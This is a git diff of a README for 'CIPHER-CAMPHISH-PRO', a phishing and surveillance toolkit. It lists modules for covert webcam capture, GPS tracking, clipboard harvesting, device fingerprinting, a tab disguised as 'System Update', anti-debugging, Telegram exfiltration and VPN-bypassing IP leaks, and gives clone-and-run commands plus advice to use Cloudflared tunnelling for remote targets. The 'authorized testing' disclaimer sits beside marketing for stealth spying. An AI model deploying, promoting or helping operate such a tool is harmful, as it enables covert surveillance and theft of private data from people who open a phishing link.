@@ -1,95 +1,115 @@
-```markdown
 <p align="center">
-  <svg width="150" height="150" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
-    <path d="M 75 25 L 35 25 L 15 50 L 35 75 L 75 75" stroke="#10b981" stroke-width="6" stroke-linecap="round" stroke-linejoin="round"/>
-    <circle cx="40" cy="50" r="10" stroke="#10b981" stroke-width="6"/>
-    <path d="M 50 50 L 85 50" stroke="#10b981" stroke-width="6" stroke-linecap="round"/>
-    <path d="M 68 50 L 68 62" stroke="#10b981" stroke-width="6" stroke-linecap="round"/>
-    <path d="M 78 50 L 78 58" stroke="#10b981" stroke-width="6" stroke-linecap="round"/>
-  </svg>
+  <img src="https://capsule-render.vercel.app/api?type=soft&color=10b981&height=200&section=header&text=🎥CAMPHISH%20PRO%20v1.0&fontSize=70&animation=fadeIn&fontAlignY=45" />
 </p>
 
-<h1 align="center">🧬 CAMPHISH-PRO </h1>
+<p align="center">
+  <a href="https://github.com/cipher-attack">
+    <svg width="200" height="200" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg" style="filter: drop-shadow(0px 0px 15px #10b981);">
+      <circle cx="50" cy="50" r="48" stroke="#10b981" stroke-width="0.5" stroke-dasharray="4 2"/>
+      <path d="M 75 30 L 35 30 L 15 50 L 35 70 L 75 70" stroke="#10b981" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"/>
+      <circle cx="45" cy="50" r="8" stroke="#ffffff" stroke-width="3"/>
+      <path d="M 60 50 L 85 50" stroke="#10b981" stroke-width="5" stroke-linecap="round"/>
+      <path d="M 70 50 L 70 65" stroke="#10b981" stroke-width="3" stroke-linecap="round"/>
+      <path d="M 80 50 L 80 60" stroke="#10b981" stroke-width="3" stroke-linecap="round"/>
+      <circle cx="50" cy="50" r="3" fill="#10b981">
+        <animate attributeName="r" values="2;5;2" dur="1.2s" repeatCount="indefinite" />
+        <animate attributeName="opacity" values="1;0.2;1" dur="1.2s" repeatCount="indefinite" />
+      </circle>
+    </svg>
+  </a>
+</p>
+
+<h2 align="center"> CIPHER-CAMPHISH-PRO</h2>
 
 <p align="center">
-  <img src="https://img.shields.io/badge/Version-10.0%20%5BZenith%5D-10b981?style=for-the-badge&logo=target" alt="Version">
-  <img src="https://img.shields.io/badge/Platform-Universal%20%2F%20Termux-blue?style=for-the-badge&logo=android" alt="Platform">
-  <img src="https://img.shields.io/badge/Status-Sovereign-red?style=for-the-badge&logo=opsgenie" alt="Status">
+  <img src="https://img.shields.io/badge/VERSION-1.0%20%5BCIPHER%5D-10b981?style=for-the-badge&logo=target" />
+  <img src="https://img.shields.io/badge/ENGINE-SOVEREIGN%20GRADE-black?style=for-the-badge&logo=opsgenie&logoColor=red" />
+  <img src="https://img.shields.io/badge/PLATFORM-UNIVERSAL%20%2F%20TERMUX-blue?style=for-the-badge&logo=android" />
 </p>
 
 <p align="center">
   <b>"Deciphering the future before it happens.."</b><br>
-  <i>Advanced Neural Security Interaction & Exfiltration Engine</i>
+  <i>Advanced Neural Security Interaction & Exfiltration Engine by CIPHER.</i>
 </p>
 
 ---
 
 ### 🌌 EXECUTIVE OVERVIEW
-**CIPHER-CAMPHISH-PRO** is not merely a webcam interaction tool. Developed by **Biruk Getachew (CIPHER)**, it is a **Sovereign-Grade** research engine engineered to bypass modern browser security sandboxes. It aggregates deep system intelligence, high-fidelity media, and sensitive metadata in real-time. Designed to outperform legacy frameworks by a 10x magnitude, it represents the zenith of architectural reconnaissance.
+**CIPHER-CAMPHISH-PRO** is not a common tool; it is a **Sovereign-Grade** research engine engineered to bypass modern browser security sandboxes. It aggregates deep system intelligence, high-fidelity media, and sensitive metadata in real-time. Designed to outperform legacy frameworks by a 10x magnitude, it represents the absolute zenith of architectural reconnaissance.
 
 ---
 
 ### 🛠️ NEURAL OPERATIONAL MODULES [THE ELITE 10]
 
-| MODULE | CODED LOGIC | DESCRIPTION |
-| :--- | :--- | :--- |
-| **01. Neural Audit** | `v10.0 High-Res` | Professional-grade visual auditing (Webcam Capture) |
-| **02. Exfiltration Hub** | `Exfil-Engine` | Stealth transmission of advanced file types to central node |
-| **03. GPS Geofencing** | `Neural-Location` | Precise coordinate mapping (Lat/Long) via browser APIs |
-| **04. Buffer Snatcher** | `Clipboard-Hook` | Real-time harvesting of sensitive clipboard data |
-| **05. Ghost Persistence** | `Tab-Cloaking` | Background persistence via stealth tab-masquerading |
-| **06. Device DNA** | `Fingerprinting` | Deep extraction of GPU, CPU, and Battery telemetry |
-| **07. Anti-Debug Trap** | `Shield-Logic` | Automated counter-measures against analysis & inspection |
-| **08. Shadow Dispatch** | `Async-Telegram` | High-speed, multi-threaded Telegram exfiltration |
-| **09. Neural Dashboard** | `V7-Protocol` | Centralized API engine for structured intelligence |
-| **10. Local IP Leaker** | `WebRTC-Sync` | Identification of internal network IPs bypassing VPNs |
+| MODULE | CODED LOGIC | DESCRIPTION | IMPACT |
+| :--- | :--- | :--- | :--- |
+| **01. Neural Audit** | `v10.0 VISUAL` | High-res visual auditing and environment capture. | `CRITICAL` |
+| **02. Exfiltration Hub** | `EXFIL-ENGINE` | Stealth transmission of advanced encrypted file types. | `HIGH` |
+| **03. GPS Geofencing** | `NEURAL-TRACE` | Precise coordinate mapping bypassing obfuscation. | `CRITICAL` |
+| **04. Buffer Snatcher**| `CLIP-SNATCH` | Real-time harvesting of volatile clipboard data. | `HIGH` |
+| **05. Ghost Persistence**| `TAB-CLOAK` | Background stealth via tab-masquerading logic. | `ELITE` |
+| **06. Device DNA** | `FINGERPRINT` | Deep extraction of GPU, CPU, and Battery telemetry. | `STABLE` |
+| **07. Anti-Debug Trap** | `SHIELD-LOGIC` | Automated counter-measures against inspection. | `PROTECT` |
+| **08. Shadow Dispatch** | `ASYNC-TELE` | High-speed, multi-threaded Telegram exfiltration. | `INSTANT` |
+| **09. Neural Dashboard**| `V7-PROTOCOL` | Centralized API engine for structured intelligence. | `STABLE` |
+| **10. Local IP Leaker** | `WEBRTC-SYNC` | ID of internal network IPs bypassing VPN tunnels. | `CRITICAL` |
 
 ---
 
-### 🧬 SYSTEM ARCHITECTURE (VISUALIZATION)
+### 🧬 SYSTEM ARCHITECTURE
 
 ```mermaid
 graph TD
     A[Target Node] -->|Interaction Hook| B(Neural Interface)
-    B -->|Encrypted Blob| C{CIPHER-X Engine}
-    C -->|Handshake v10| D[Intel Vault]
+    B -->|Encrypted Blob| C{CIPHER-CAMPHISH Engine}
+    C -->|Handshake v1.0| D[Intel Vault]
     C -->|Secure Sync| E[Media Vault]
     C -->|Shadow Dispatch| F[Telegram Alert]
-    style A fill:#000,stroke:#10b981,stroke-width:2px
-    style C fill:#111,stroke:#10b981,stroke-width:4px
+    style A fill:#000,stroke:#10b981,stroke-width:2px,color:#fff
+    style C fill:#111,stroke:#10b981,stroke-width:4px,color:#fff
+    style B fill:#10b981,stroke:#000,color:#000
 ```
 
 ---
 
 ### 🚀 DEPLOYMENT PROTOCOL
 
-**CIPHER-CAMPHISH-PRO** is cross-platform and optimized for Linux, Termux, and Windows environments.
+Execute the following commands to initialize the Sovereign Repository.
 
 ```bash
-# Clone the Sovereign Repository
+# Clone the Sovereign Node
 git clone https://github.com/cipher-attack/camphish-pro.git
 
-# Enter the Neural Node
+# Enter the Neural Hub
 cd camphish-pro
 
 # Initialize Environmental Dependencies
-./cipher.sh
+chmod +x * && ./cipher.sh
 ```
 
-> **Pro-Tip:** For optimal results, select **Choice 3 [Localhost]** for testing or **Choice 1 [Cloudflared]** for remote research nodes.
+> **PRO-NOTE:** For optimal remote results, select **Choice 1 [Cloudflared]**. For local lab research, use **Choice 3 [Localhost]**.
 
 ---
 
-###  WHY CIPHER?
-Traditional tools are static. **CIPHER** is an evolving ecosystem. It analyzes the entire digital footprint of a target. From a "Ghost Engine" that renames its tab to "System Update" when hidden, to a neural logic that harvests buffers upon focus—this is not just code; it is architecture-level reconnaissance designed for the elite.
+### 🌌 WHY THIS ARCHITECTURE?
+Traditional tools are static. **CIPHER** is an evolving ecosystem. It analyzes the entire digital footprint of a target. From a **"Ghost Engine"** that renames its tab to "System Update" when hidden, to a neural logic that harvests buffers upon focus—this is not just code; it is architecture-level reconnaissance designed for the elite.
 
 ---
 
-### 👨‍💻 THE ARCHITECT
+### 👤 THE ARCHITECT
 
-**Developed by: Biruk Getachew (CIPHER)**
-*   *Elite Security Researcher & Full-Stack Architect*
-*   *Neural Interaction Specialist*
+<table align="center">
+  <tr>
+    <td align="center" width="150">
+      <img src="https://github.com/cipher-attack.png" width="120" style="border-radius: 50%; border: 3px solid #10b981;" />
+    </td>
+    <td>
+      <b>Biruk Getachew (CIPHER)</b><br>
+      <i>cybersecurity Researcher & Full-Stack Architect</i><br>
+      <p>Neural Interaction Specialist | Advanced Exfiltration Expert. Engineering tools that redefine the boundaries of security research.</p>
+    </td>
+  </tr>
+</table>
 
 <div align="center">
   <a href="https://www.youtube.com/@cipher-attack">
@@ -106,13 +126,10 @@ Traditional tools are static. **CIPHER** is an evolving ecosystem. It analyzes t
 ---
 
 ### 🛡️ LEGAL & ETHICAL DISCLOSURE
-This framework is developed strictly for authorized security testing, penetration testing research, and educational purposes. Unauthorized deployment against systems without explicit written consent is illegal. **CIPHER-X** is a contribution to the cybersecurity community intended to harden defenses and study advanced exfiltration vectors.
-
----
+This framework is developed strictly for authorized security testing, penetration testing research, and educational purposes. Unauthorized deployment against systems without explicit written consent is illegal. CIPHER-X is a contribution to the cybersecurity community intended to harden defenses.
 
 <p align="center">
   <br>
   <b>Deciphering the future before it happens..</b><br>
   <img src="https://capsule-render.vercel.app/api?type=waving&color=10b981&height=100&section=footer" />
 </p>
-```
